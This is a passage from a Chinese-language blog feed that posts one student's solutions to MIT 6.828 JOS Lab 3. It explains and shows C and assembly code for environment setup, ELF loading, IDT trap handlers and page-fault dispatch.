&#123;</span><br><span class="line">env_destroy(curenv);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;修改trap_dispatch()使断点异常发生时，能够触发kernel monitor。修改完成后运行 make grade，运行结果应该
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】Lab3-Exercise5</title>
    <link href="https://billyotry.github.io/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise5/"/>
    <id>https://billyotry.github.io/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise5/</id>
    <published>2021-08-06T05:00:17.650Z</published>
    <updated>2021-08-08T15:40:54.069Z</updated>
    
    <content type="html"><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>修改一下 trap_dispatch 函数，使系统能够把缺页异常引导到 page_fault_handler() 上执行。在修改完成后，运行 make grade，出现的结果应该是你修改后的 JOS 可以成功运行 faultread，faultreadkernel，faultwrite，faultwritekernel 测试程序。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>据 trapentry.S 文件中的 TRAPHANDLER 函数可知，这个函数会把当前中断的中断码压入堆栈中，再根据 inc/trap.h 文件中的 Trapframe 结构体我们可以知道，Trapframe 中的 tf_trapno 成员代表这个中断的中断码。所以在 trap_dispatch 函数中我们需要根据输入的 Trapframe 指针 tf 中的 tf_trapno 成员来判断到来的中断是什么中断，这里我们需要判断是否是缺页中断，如果是则执行 page_fault_handler 函数，所以我们可以这么修改代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">trap_dispatch(struct Trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Handle processor exceptions.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == T_PGFLT) &#123;</span><br><span class="line">page_fault_handler(tf);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Unexpected trap: The user process or the kernel has a bug.</span></span><br><span class="line">print_trapframe(tf);</span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_cs == GD_KT)</span><br><span class="line">panic(<span class="string">&quot;unhandled trap in kernel&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">env_destroy(curenv);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;修改一下 trap_dispatch 函数，使系统能够把缺页异常引导到 page_fault_handler() 上执行。在修改完成后，运行
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】Lab3-Exercise4</title>
    <link href="https://billyotry.github.io/2021/08/05/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise4/"/>
    <id>https://billyotry.github.io/2021/08/05/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise4/</id>
    <published>2021-08-05T13:37:30.882Z</published>
    <updated>2021-08-06T05:24:46.909Z</updated>
    
    <content type="html"><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>编辑一下trapentry.S 和 trap.c 文件，并且实现上面所说的功能。宏定义 TRAPHANDLER 和 TRAPHANDLER_NOEC 会对你有帮助。你将会在 trapentry.S文件中为在inc/trap.h文件中的每一个trap加入一个入口值， 你也将会提供_alttraps的值。</p><p>你需要修改trap_init()函数来初始化idt表，使表中每一项指向定义在trapentry.S中的入口指针，SETGATE宏定义在这里用得上。</p><p>　　　　你所实现的 _alltraps 应该：</p><p>　　　　1. 把值压入堆栈使堆栈看起来像一个结构体 Trapframe</p><p>　　　　2. 加载 GD_KD 的值到 %ds, %es寄存器中</p><p>　　　　3. 把%esp的值压入，并且传递一个指向Trapframe的指针到trap()函数中。</p><p>　　　　4. 调用trap</p><p>　　考虑使用pushal指令，他会很好的和结构体 Trapframe 的布局配合好。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先看一下 trapentry.S 文件，里面定义了两个宏定义，TRAPHANDLER，TRAPHANDLER_NOEC。他们的功能从汇编代码中可以看出：声明了一个全局符号name，并且这个符号是函数类型的，代表它是一个中断处理函数名。其实这里就是两个宏定义的函数。这两个函数就是当系统检测到一个中断/异常时，需要首先完成的一部分操作，包括：中断异常码，中断错误码(error code)。正是因为有些中断有中断错误码，有些没有，所以我们采用利用两个宏定义函数。</p><p>然后就会调用alltraps，_alltraps函数其实就是为了能够让程序在之后调用trap.c中的trap函数时，能够正确的访问到输入的参数，即Trapframe指针类型的输入参数tf。</p><p>所以在trapentry.S中，我们要根据这个中断是否有中断错误码，来选择调用TRAPHANDLER，还是TRAPHANDLER_NOEC，然后再统一调用_alltraps，其实目的就是为了能够让系统在正式运行中断处理程序之前完成必要的准备工作，比如保存现场等等</p><p>查看<a href="https://link.zhihu.com/?target=https%3A//pdos.csail.mit.edu/6.828/2018/readings/i386/s09_08.htm">x86所有异常</a>后我们可以知道哪些需要压入压入error code，哪些不用来决定到底使用哪个宏。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">TRAPHANDLER_NOEC(t_divide, T_DIVIDE)</span><br><span class="line">TRAPHANDLER_NOEC(t_debug, T_DEBUG)</span><br><span class="line">TRAPHANDLER_NOEC(t_nmi, T_NMI)</span><br><span class="line">TRAPHANDLER_NOEC(t_brkpt, T_BRKPT)</span><br><span class="line">TRAPHANDLER_NOEC(t_oflow, T_OFLOW)</span><br><span class="line">TRAPHANDLER_NOEC(t_bound, T_BOUND)</span><br><span class="line">TRAPHANDLER_NOEC(t_illop, T_ILLOP)</span><br><span class="line">TRAPHANDLER_NOEC(t_device, T_DEVICE)</span><br><span class="line">TRAPHANDLER(t_dblflt, T_DBLFLT)</span><br><span class="line">TRAPHANDLER(t_tss, T_TSS)</span><br><span class="line">TRAPHANDLER(t_segnp, T_SEGNP)</span><br><span class="line">TRAPHANDLER(t_stack, T_STACK)</span><br><span class="line">TRAPHANDLER(t_gpflt, T_GPFLT)</span><br><span class="line">TRAPHANDLER(t_pgflt, T_PGFLT)</span><br><span class="line">TRAPHANDLER(t_fperr, T_FPERR)</span><br><span class="line">TRAPHANDLER(t_align, T_ALIGN)</span><br><span class="line">TRAPHANDLER(t_mchk, T_MCHK)</span><br><span class="line">TRAPHANDLER(t_simderr, T_SIMDERR)</span><br><span class="line"></span><br><span class="line">TRAPHANDLER_NOEC(t_syscall, T_SYSCALL)</span><br></pre></td></tr></table></figure><p>我们使用这两个宏创建了所有宏的入口，故所有中断都要跳转到_alltraps，同时每个中断入口的创建形式都一样，也就具有了实际上的<strong>中断统一入口</strong>。</p><p>在函数trap_init中，将刚刚写好的一系列入口，以函数指针的形式，写进中断描述符表。给宏<code>SETGATE</code>传函数名和对应的中断序号即可，在使用函数名之前，必须先声明函数，告诉连接器要使用来自另一个文件的<code>symbol</code>。如要初始化<code>Divide By 0</code>：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">t_divide</span><span class="params">()</span></span>;</span><br><span class="line">SETGATE(idt[T_DIVIDE], <span class="number">0</span>, GD_KT, t_divide, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>最后我们的trap_init代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">trap_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">Segdesc</span> <span class="title">gdt</span>[];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">SETGATE(idt[T_DIVIDE], <span class="number">0</span>, GD_KT, t_divide, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_DEBUG], <span class="number">0</span>, GD_KT, t_debug, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_NMI], <span class="number">0</span>, GD_KT, t_nmi, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_BRKPT], <span class="number">1</span>, GD_KT, t_brkpt, <span class="number">3</span>);</span><br><span class="line">SETGATE(idt[T_OFLOW], <span class="number">1</span>, GD_KT, t_oflow, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_BOUND], <span class="number">0</span>, GD_KT, t_bound, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_ILLOP], <span class="number">0</span>, GD_KT, t_illop, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_DEVICE], <span class="number">0</span>, GD_KT, t_device, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_DBLFLT], <span class="number">0</span>, GD_KT, t_dblflt, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_TSS], <span class="number">0</span>, GD_KT, t_tss, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_SEGNP], <span class="number">0</span>, GD_KT, t_segnp, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_STACK], <span class="number">0</span>, GD_KT, t_stack, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_GPFLT], <span class="number">0</span>, GD_KT, t_gpflt, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_PGFLT], <span class="number">0</span>, GD_KT, t_pgflt, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_FPERR], <span class="number">0</span>, GD_KT, t_fperr, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_ALIGN], <span class="number">0</span>, GD_KT, t_align, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_MCHK], <span class="number">0</span>, GD_KT, t_mchk, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_SIMDERR], <span class="number">0</span>, GD_KT, t_simderr, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_SYSCALL], <span class="number">1</span>, GD_KT, t_syscall, <span class="number">3</span>);</span><br><span class="line"><span class="comment">// Per-CPU setup </span></span><br><span class="line">trap_init_percpu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>别忘记在前面声明函数。这样我们就建立起了IDT表，trap_init_percpu()中的<code>lidt(&amp;idt_pd);</code>正式加载IDT。但是此时中断还不能执行，我们还需要完成trapentry.S中的汇编代码。</p><p>从<code>_alltraps</code>开始，每个中断都会走过相同的代码。<code>Lab</code>要求我们在<code>_alltraps</code>中进行如下操作：</p><ol><li>让更多信息进栈，使得栈具有结构体<code>struct TrapFrame</code>的形式。</li><li>在寄存器<code>%ds, %es</code>的位置上放置宏<code>GD_KD</code>的值。</li><li>将当前栈指针压栈，给<code>trap</code>函数传参。</li><li>调用<code>trap</code>函数。</li></ol><p>总的来说，这段代码的意义就是正确的给trap函数传参，重点在把栈制作得和一个<code>struct TrapFrame</code>一样。</p><p>其实我们离答案很近。翻到上文的一张图片，可以发现，中断产生时，处理器已经自动压了一部分信息到栈上。</p><p>联系<code>struct TrapFrame</code>的声明，可以看到，从最后一个元素，寄存器<code>ss</code>的值，到结构体的第8个声明的属性<code>uintptr_t tf_eip</code>，处理器都已经压好了。在进入<code>_alltraps</code>之前，前面的代码还处理好了<code>error code</code>和<code>trap number</code>，现在仅剩<code>tf_ds, tf_es, tf_regs</code>需要处理。</p><p><code>Lab</code>讲义中说得很明确，要给<code>ds, es</code>寄存器传宏<code>GD_KD</code>的值，这又解决了一个问题。以上一瞬间解决了几乎所有需要处理的<code>struct TrapFrame</code>成员，可以写出前半部分代码如下。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">_alltraps:</span><br><span class="line">    pushl %ds</span><br><span class="line">    pushl %es</span><br></pre></td></tr></table></figure><p>剩下的<code>struct PushRegs</code>结构体，可以直接通过<code>popa</code>指令构造。<code>pusha</code>指令意为<code>push all registers</code>，将所有寄存器的值压栈，顺序正好对应<code>struct PushRegs</code>的声明顺序。</p><p>再接着将<code>GD_KD</code>的值赋值给寄存器<code>ds, es</code>，就可以调用<code>trap</code>函数了。完整代码如下：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">_alltraps:</span><br><span class="line">    pushl %ds</span><br><span class="line">    pushl %es</span><br><span class="line">    pushal</span><br><span class="line">    # load GD_KD into %ds, %es</span><br><span class="line">    movw $(GD_KD), %ax</span><br><span class="line">    movw %ax, %ds</span><br><span class="line">    movw %ax, %es</span><br><span class="line">    # pass a pointer to the trap frame for function trap</span><br><span class="line">    pushl %esp</span><br><span class="line">    call trap</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;编辑一下trapentry.S 和 trap.c 文件，并且实现上面所说的功能。宏定义 TRAPHANDLER 和 TRAPHANDLER_
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】Lab3-Exercise2</title>
    <link href="https://billyotry.github.io/2021/08/03/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise2/"/>
    <id>https://billyotry.github.io/2021/08/03/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise2/</id>
    <published>2021-08-03T12:44:49.937Z</published>
    <updated>2021-08-04T16:22:23.771Z</updated>
    
    <content type="html"><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>在env.c中完成env_init、env_setup_vm、region_alloc、load_icode、env_create、env_run函数</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>env_init函数比较简单，就是遍历envs数组，将env_id字段置零，然后link字段更新下，只不过要注意顺序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">env_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Set up envs array</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = NENV - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i--)&#123;</span><br><span class="line">envs[i].env_id = <span class="number">0</span>;</span><br><span class="line">envs[i].env_link = env_free_list;</span><br><span class="line">env_free_list = &amp;envs[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Per-CPU part of the initialization</span></span><br><span class="line">env_init_percpu();<span class="comment">//加载全局描述符表并且初始化段寄存器gs, fs, es, ds, ss</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是env_setup_vm函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">env_setup_vm(struct Env *e)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a page for the page directory</span></span><br><span class="line"><span class="keyword">if</span> (!(p = page_alloc(ALLOC_ZERO)))</span><br><span class="line"><span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now, set e-&gt;env_pgdir and initialize the page directory.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint:</span></span><br><span class="line"><span class="comment">//    - The VA space of all envs is identical above UTOP</span></span><br><span class="line"><span class="comment">//(except at UVPT, which we&#x27;ve set below).</span></span><br><span class="line"><span class="comment">//See inc/memlayout.h for permissions and layout.</span></span><br><span class="line"><span class="comment">//Can you use kern_pgdir as a template?  Hint: Yes.</span></span><br><span class="line"><span class="comment">//(Make sure you got the permissions right in Lab 2.)</span></span><br><span class="line"><span class="comment">//    - The initial VA below UTOP is empty.</span></span><br><span class="line"><span class="comment">//    - You do not need to make any more calls to page_alloc.</span></span><br><span class="line"><span class="comment">//    - Note: In general, pp_ref is not maintained for</span></span><br><span class="line"><span class="comment">//physical pages mapped only above UTOP, but env_pgdir</span></span><br><span class="line"><span class="comment">//is an exception -- you need to increment env_pgdir&#x27;s</span></span><br><span class="line"><span class="comment">//pp_ref for env_free to work correctly.</span></span><br><span class="line"><span class="comment">//    - The functions in kern/pmap.h are handy.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">e-&gt;env_pgdir = (<span class="keyword">pte_t</span>*)page2kva(p);</span><br><span class="line">p-&gt;pp_ref++;</span><br><span class="line"><span class="built_in">memcpy</span>(e-&gt;env_pgdir, kern_pgdir, PGSIZE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// UVPT maps the env&#x27;s own page table read-only.</span></span><br><span class="line"><span class="comment">// Permissions: kernel R, user R</span></span><br><span class="line">e-&gt;env_pgdir[PDX(UVPT)] = PADDR(e-&gt;env_pgdir) | PTE_P | PTE_U;<span class="comment">//唯一需要修改的是UVPT需要映射到当前环境的页目录物理地址e-&gt;env_pgdir处，而不是内核的页目录物理地址kern_pgdir处</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总的思路就是给e指向的Env结构分配页目录，并且继承内核的页目录结构，唯一需要修改的是UVPT需要映射到当前环境的页目录物理地址e-&gt;env_pgdir处，而不是内核的页目录物理地址kern_pgdir处。设置完页目录也就确定了当前用户环境线性地址空间到物理地址空间的映射</p><p>然后是region_alloc为用户环境分配物理空间，这里注意我们要先把起始地址和终止地址进行页对齐，对齐之后我们就可以以页为单位来分配内存，然后修改页目录表和页表：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">region_alloc(struct Env *e, <span class="keyword">void</span> *va, <span class="keyword">size_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="comment">// (But only if you need it for load_icode.)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: It is easier to use region_alloc if the caller can pass</span></span><br><span class="line"><span class="comment">//   &#x27;va&#x27; and &#x27;len&#x27; values that are not page-aligned.</span></span><br><span class="line"><span class="comment">//   You should round va down, and round (va + len) up.</span></span><br><span class="line"><span class="comment">//   (Watch out for corner-cases!)</span></span><br><span class="line"><span class="comment">//round down va and round up va+len</span></span><br><span class="line"><span class="comment">//这样我们实际分配的地址就是va-xxx和va+len+xxx，这样就可以把va到va+len包含进去</span></span><br><span class="line"><span class="keyword">void</span> *begin = (<span class="keyword">void</span>*)ROUNDDOWN((<span class="keyword">uint32_t</span>)va,PGSIZE);</span><br><span class="line"><span class="keyword">void</span> *end = (<span class="keyword">void</span>*)ROUNDUP((<span class="keyword">uint32_t</span>)va+len,PGSIZE);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">void</span> *i = begin;i &lt; end; i+=PGSIZE)&#123; <span class="comment">//这里不需要等于，最后一页的最后地址就是end</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span>* <span class="title">pp</span> =</span> page_alloc(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(pp == <span class="literal">NULL</span>)&#123;</span><br><span class="line">panic(<span class="string">&quot;region_alloc(): allocation failed!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>((page_insert(e-&gt;env_pgdir,pp,i,PTE_W | PTE_U)) != <span class="number">0</span>)&#123;</span><br><span class="line">panic(<span class="string">&quot;region_allooc error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>load_icode 这里相当于实现一个ELF可执行文件加载器，ELF文件以一个ELF文件头开始，通过ELFHDR-&gt;e_magic字段判断该文件是否是ELF格式的，然后通过ELFHDR-&gt;e_phoff获取程序头距离ELF文件的偏移，ph指向的就是程序头的起始位置，相当于一个数组，程序头记录了有哪些Segment需要加载，加载到线性地址的何处？ph_num保存了总共有多少Segment。遍历ph数组，分配线性地址p_va开始的p_memsz大小的空间。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">load_icode(struct Env *e, <span class="keyword">uint8_t</span> *binary)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Hints:</span></span><br><span class="line"><span class="comment">//  Load each program segment into virtual memory</span></span><br><span class="line"><span class="comment">//  at the address specified in the ELF segment header.</span></span><br><span class="line"><span class="comment">//  You should only load segments with ph-&gt;p_type == ELF_PROG_LOAD.</span></span><br><span class="line"><span class="comment">//  Each segment&#x27;s virtual address can be found in ph-&gt;p_va</span></span><br><span class="line"><span class="comment">//  and its size in memory can be found in ph-&gt;p_memsz.</span></span><br><span class="line"><span class="comment">//  The ph-&gt;p_filesz bytes from the ELF binary, starting at</span></span><br><span class="line"><span class="comment">//  &#x27;binary + ph-&gt;p_offset&#x27;, should be copied to virtual address</span></span><br><span class="line"><span class="comment">//  ph-&gt;p_va.  Any remaining memory bytes should be cleared to zero.</span></span><br><span class="line"><span class="comment">//  (The ELF header should have ph-&gt;p_filesz &lt;= ph-&gt;p_memsz.)</span></span><br><span class="line"><span class="comment">//  Use functions from the previous lab to allocate and map pages.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  All page protection bits should be user read/write for now.</span></span><br><span class="line"><span class="comment">//  ELF segments are not necessarily page-aligned, but you can</span></span><br><span class="line"><span class="comment">//  assume for this function that no two segments will touch</span></span><br><span class="line"><span class="comment">//  the same virtual page.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  You may find a function like region_alloc useful.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Loading the segments is much simpler if you can move data</span></span><br><span class="line"><span class="comment">//  directly into the virtual addresses stored in the ELF binary.</span></span><br><span class="line"><span class="comment">//  So which page directory should be in force during</span></span><br><span class="line"><span class="comment">//  this function?</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  You must also do something with the program&#x27;s entry point,</span></span><br><span class="line"><span class="comment">//  to make sure that the environment starts executing there.</span></span><br><span class="line"><span class="comment">//  What?  (See env_run() and env_pop_tf() below.)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Elf</span>* <span class="title">header</span> =</span> (struct Elf*)binary;</span><br><span class="line"><span class="keyword">if</span>(header-&gt;e_magic != ELF_MAGIC)&#123;</span><br><span class="line">panic(<span class="string">&quot;load_icode(): The binary we load is not elf\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(header-&gt;e_entry == <span class="number">0</span>)&#123;</span><br><span class="line">panic(<span class="string">&quot;load_icode(): The elf file can&#x27;t be excuterd.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">e-&gt;env_tf.tf_eip = header-&gt;e_entry;</span><br><span class="line">lcr3(PADDR(e-&gt;env_pgdir));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Proghdr</span> *<span class="title">ph</span>,*<span class="title">eph</span>;</span></span><br><span class="line">ph = (struct Proghdr*)((<span class="keyword">uint8_t</span>*)header + header-&gt;e_phoff);<span class="comment">//指向程序头，记录哪些seg需要加载等等</span></span><br><span class="line">eph = ph + header-&gt;e_phnum;<span class="comment">//seg的数量</span></span><br><span class="line"><span class="keyword">for</span>(;ph &lt; eph; ph++)&#123;</span><br><span class="line"><span class="keyword">if</span>(ph-&gt;p_type == ELF_PROG_LOAD)&#123;</span><br><span class="line"><span class="keyword">if</span>(ph-&gt;p_memsz &lt; ph-&gt;p_filesz)&#123;</span><br><span class="line">panic(<span class="string">&quot;load icode(): p_memsz &lt; p_filesz.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">region_alloc(e,(<span class="keyword">void</span>*)ph-&gt;p_va,ph-&gt;p_memsz);</span><br><span class="line">memmove((<span class="keyword">void</span> *)ph-&gt;p_va, binary + ph-&gt;p_offset, ph-&gt;p_filesz);</span><br><span class="line">        <span class="built_in">memset</span>((<span class="keyword">void</span> *)(ph-&gt;p_va + ph-&gt;p_filesz), <span class="number">0</span>, ph-&gt;p_memsz - ph-&gt;p_filesz);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">lcr3(PADDR(kern_pgdir));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now map one page for the program&#x27;s initial stack</span></span><br><span class="line"><span class="comment">// at virtual address USTACKTOP - PGSIZE.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">region_alloc(e,(<span class="keyword">void</span>*)USTACKTOP - PGSIZE,PGSIZE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>env_create 是利用env_alloc函数和load_icode函数，加载一个ELF文件到用户环境中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">env_create(<span class="keyword">uint8_t</span> *binary, <span class="keyword">enum</span> EnvType type)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">e</span>;</span> </span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">if</span>(env_alloc(&amp;e,<span class="number">0</span>) != <span class="number">0</span>)&#123;</span><br><span class="line">panic(<span class="string">&quot;env_alloc(): env_alloc failed!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">load_icode(e,binary);</span><br><span class="line">e-&gt;env_type = type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>env_run函数执行e指向的用户环境</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">env_run(struct Env *e)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Step 1: If this is a context switch (a new environment is running):</span></span><br><span class="line"><span class="comment">//   1. Set the current environment (if any) back to</span></span><br><span class="line"><span class="comment">//      ENV_RUNNABLE if it is ENV_RUNNING (think about</span></span><br><span class="line"><span class="comment">//      what other states it can be in),</span></span><br><span class="line"><span class="comment">//   2. Set &#x27;curenv&#x27; to the new environment,</span></span><br><span class="line"><span class="comment">//   3. Set its status to ENV_RUNNING,</span></span><br><span class="line"><span class="comment">//   4. Update its &#x27;env_runs&#x27; counter,</span></span><br><span class="line"><span class="comment">//   5. Use lcr3() to switch to its address space.</span></span><br><span class="line"><span class="comment">// Step 2: Use env_pop_tf() to restore the environment&#x27;s</span></span><br><span class="line"><span class="comment">//   registers and drop into user mode in the</span></span><br><span class="line"><span class="comment">//   environment.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Hint: This function loads the new environment&#x27;s state from</span></span><br><span class="line"><span class="comment">//e-&gt;env_tf.  Go back through the code you wrote above</span></span><br><span class="line"><span class="comment">//and make sure you have set the relevant parts of</span></span><br><span class="line"><span class="comment">//e-&gt;env_tf to sensible values.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//panic(&quot;env_run not yet implemented&quot;);</span></span><br><span class="line"><span class="keyword">if</span>(curenv != <span class="literal">NULL</span> &amp;&amp; curenv-&gt;env_status == ENV_RUNNING)&#123;</span><br><span class="line">curenv-&gt;env_status = ENV_RUNNABLE;</span><br><span class="line">&#125;</span><br><span class="line">curenv = e;</span><br><span class="line">e-&gt;env_status = ENV_RUNNING;</span><br><span class="line">e-&gt;env_runs ++;</span><br><span class="line">lcr3(PADDR(e-&gt;env_pgdir));</span><br><span class="line">env_pop_tf(&amp;e-&gt;env_tf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里如果没什么问题，当我们用gdb去调试会发现在int 0x30指令处出错了，那是因为我们还没实现，那是接下来的任务了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;在env.c中完成env_init、env_setup_vm、region_alloc、load_icode、env_create、env_
      
    
    </summary>
    
    
